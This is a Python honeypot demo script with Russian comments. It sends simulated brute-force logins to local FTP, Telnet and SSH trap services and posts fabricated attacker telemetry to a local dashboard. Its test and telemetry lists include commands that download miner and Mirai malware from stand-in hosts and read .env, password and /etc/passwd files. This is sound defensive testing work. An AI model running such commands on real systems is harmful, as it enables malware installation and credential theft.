#!/usr/bin/env python3
"""
HoneyForge Demo & Attack Simulation Script
Имитирует реальные сетевые атаки на сервисы ловушки (FTP, Telnet, SSH),
а также генерирует разнородную телеметрию для демонстрации GeoIP-карты и SOC-дашборда.
"""

import sys
import time
import socket
import json
import random
import requests

try:
    import paramiko
except ImportError:
    paramiko = None

CENTER_URL = "http://localhost:8080/cdn/assets/v2/metrics.json"

REALISTIC_ATTACKERS = [
    {"ip": "185.220.101.5", "country": "Germany", "code": "DE", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821},
    {"ip": "194.26.29.112", "country": "Netherlands", "code": "NL", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041},
    {"ip": "45.154.255.89", "country": "United States", "code": "US", "city": "Ashburn", "lat": 39.0438, "lon": -77.4874},
    {"ip": "103.203.57.18", "country": "Singapore", "code": "SG", "city": "Singapore", "lat": 1.3521, "lon": 103.8198},
    {"ip": "180.163.220.45", "country": "China", "code": "CN", "city": "Shanghai", "lat": 31.2304, "lon": 121.4737},
    {"ip": "89.208.107.12", "country": "France", "code": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522},
    {"ip": "212.102.34.61", "country": "United Kingdom", "code": "GB", "city": "London", "lat": 51.5074, "lon": -0.1278},
]

COMMON_BOT_PASSWORDS = ["admin123", "root", "123456", "password", "toor", "default", "admin@2026", "service123"]
COMMON_BOT_USERS = ["root", "admin", "user", "support", "ubuntu", "test", "postgres"]

def attack_ftp():
    print("\n[>] 1. Тестирование FTP-ловушки (Port 2121)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("127.0.0.1", 2121))
        banner = s.recv(1024).decode('utf-8', errors='ignore')
        print(f"    Ответ баннера: {banner.strip()}")
        
        s.send(b"USER admin\r\n")
        user_resp = s.recv(1024).decode('utf-8', errors='ignore')
        print(f"    USER admin -> {user_resp.strip()}")

        s.send(b"PASS 123456\r\n")
        pass_resp = s.recv(1024).decode('utf-8', errors='ignore')
        print(f"    PASS 123456 -> {pass_resp.strip()}")

        s.send(b"QUIT\r\n")
        s.close()
        print("    [+] Успех: FTP атака перехвачена ловушкой!")
    except Exception as e:
        print(f"    [-] Ошибка подключения к FTP: {e}")


def attack_telnet():
    print("\n[>] 2. Тестирование Telnet-ловушки (Port 2323 / Mirai emulation)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("127.0.0.1", 2323))
        banner = s.recv(1024).decode('utf-8', errors='ignore')
        
        s.send(b"root\r\n")
        time.sleep(0.2)
        s.recv(1024)
        
        s.send(b"admin123\r\n")
        time.sleep(0.2)
        s.recv(1024)

        s.send(b"cat /proc/mounts\r\n")
        time.sleep(0.3)
        resp = s.recv(1024).decode('utf-8', errors='ignore')
        print(f"    Ответ на 'cat /proc/mounts':\n    {resp.strip()}")

        s.send(b"exit\r\n")
        s.close()
        print("    [+] Успех: Telnet инцидент перехвачен ловушкой!")
    except Exception as e:
        print(f"    [-] Ошибка подключения к Telnet: {e}")


def attack_ssh():
    print("\n[>] 3. Тестирование SSH-ловушки (Port 2222 / Medium-interaction)...")
    if not paramiko:
        print("    [-] Paramiko не установлен локально, пропускаем SSH интерактив")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("    Попытка авторизации root:P@ssw0rd2026...")
        ssh.connect("127.0.0.1", port=2222, username="root", password="P@ssw0rd2026", timeout=5)
        
        channel = ssh.invoke_shell()
        time.sleep(0.5)
        out = channel.recv(2048).decode('utf-8', errors='ignore')
        print(f"    SSH баннер получен:\n{out}")

        commands_to_test = [
            "whoami",
            "uname -a",
            "cat passwords.txt",
            "cat .env",
            "wget http://malware-c2.net/xmrig_miner.sh"
        ]

        for cmd in commands_to_test:
            print(f"    -> Выполнение команды: {cmd}")
            channel.send(cmd + "\r")
            time.sleep(0.6)
            cmd_out = channel.recv(4096).decode('utf-8', errors='ignore')
            print(f"    <- Результат:\n{cmd_out.strip()}\n")

        channel.send("exit\r")
        ssh.close()
        print("    [+] Успех: Все SSH команды перехвачены и задокументированы!")
    except Exception as e:
        print(f"    [-] Ошибка подключения к SSH: {e}")


def simulate_geo_attacks():
    print("\n[>] 4. Генерация международной телеметрии для Карты Угроз и SOC Дашборда...")
    for _ in range(12):
        attacker = random.choice(REALISTIC_ATTACKERS)
        etype = random.choice([
            "scan_detected", "ssh_auth", "telnet_auth", "ftp_auth", "ssh_command"
        ])
        
        details = {}
        if "auth" in etype:
            details = {
                "username": random.choice(COMMON_BOT_USERS),
                "password": random.choice(COMMON_BOT_PASSWORDS),
                "target_port": 2222 if "ssh" in etype else (23 if "telnet" in etype else 21)
            }
        elif etype == "ssh_command":
            cmd = random.choice([
                "cat /etc/passwd", "curl -O http://botnet.cc/mirai.arm",
                "uname -a", "ps aux | grep miner", "cat .env", "chmod +x miner"
            ])
            details = {"command": cmd, "target_port": 2222}
        else:
            details = {"target_port": random.choice([21, 22, 23, 80, 8080, 3306]), "protocol": "TCP"}

        payload = {
            "honeypot_id": 1,
            "node_id": "dmz-node-alpha",
            "event_type": etype,
            "source_ip": attacker["ip"],
            "details": details
        }
        try:
            requests.post(CENTER_URL, json=payload, timeout=2)
            print(f"    Событие: {etype:<15} от {attacker['country']:<15} ({attacker['ip']})")
        except Exception:
            pass
        time.sleep(0.2)
    print("    [+] Успех: Дашборд наполнен реальными гео-событиями!")


if __name__ == "__main__":
    print("=" * 60)
    print("🍯 HONEYFORGE INCIDENT & ATTACK SIMULATOR")
    print("=" * 60)
    attack_ftp()
    attack_telnet()
    attack_ssh()
    simulate_geo_attacks()
    print("\n" + "=" * 60)
    print("Готово! Откройте дашборд в браузере: http://localhost:8080")
    print("=" * 60)
